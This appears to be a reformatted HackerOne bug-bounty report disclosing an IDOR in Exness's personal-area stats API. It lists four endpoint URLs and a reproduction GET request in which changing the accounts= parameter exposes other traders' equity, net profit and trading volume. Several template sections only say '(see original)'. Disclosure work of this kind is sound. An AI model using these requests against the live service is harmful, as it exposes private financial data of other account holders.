# IDOR in Stats API Endpoint Allows Viewing Equity or Net Profit of Any MT Account 

## Metadata
- **Source:** HackerOne
- **Report:** 1644436 | https://hackerone.com/reports/1644436
- **Submitted:** 2022-07-21
- **Reporter:** ashwarya
- **Program:** Unknown
- **Bounty:** Not disclosed
- **Severity:** medium
- **Vuln:** Insecure Direct Object Reference (IDOR)
- **CVEs:** None
- **Category:** web-api

## Summary
Hi Team,

Today I logged into my Exness PA and noticed an updated performance [page](https://my.exness.com/pa/performance/summary). I thought to give it a quick check and noticed that the API endpoints responsible for fetching the stats performance chart (```*/stats/*```) is vulnerable to IDOR via `accounts=` parameter. The issue allows fetching the stats of any MT account and discloses the accoun

## Attack scenario
*(see original)*

## Root cause
*(see original)*

## Attacker mindset
*(see original)*

## Defensive takeaways
*(see original)*

## Variant hunting
*(see original)*

## MITRE ATT&CK
*(see original)*

## Notes
*(see original)*

## Full report
<details><summary>Expand</summary>

Hi Team,

Today I logged into my Exness PA and noticed an updated performance [page](https://my.exness.com/pa/performance/summary). I thought to give it a quick check and noticed that the API endpoints responsible for fetching the stats performance chart (```*/stats/*```) is vulnerable to IDOR via `accounts=` parameter. The issue allows fetching the stats of any MT account and discloses the account equity / net profit  of the corresponding account.

#Vulnerable Endpoints
```
https://my.exness.com/v3/personal_area/stats/net_profit?time_range=365&accounts={accountNumber}
https://my.exness.com/v3/personal_area/stats/orders_number?time_range=365&accounts={accountNumber}
https://my.exness.com/v3/personal_area/stats/trading_volume?time_range=365&accounts={accountNumber}
https://my.exness.com/v3/personal_area/stats/equity?time_range=365&accounts={accountNumber}
```

#Steps to Reproduce
```
GET /v3/personal_area/stats/equity?time_range=365&accounts=xxx HTTP/2
Host: my.exness.com
Authorization: Bearer xyz
Content-Type: application/json
```


#Proof of Concept

███████

## Impact

IDOR allows stats of any MT trading account. The stats includes account net profit, closed order counts, trading volumes and daily equity figures.

</details>

---
*Analysed by Claude on 2026-05-24*
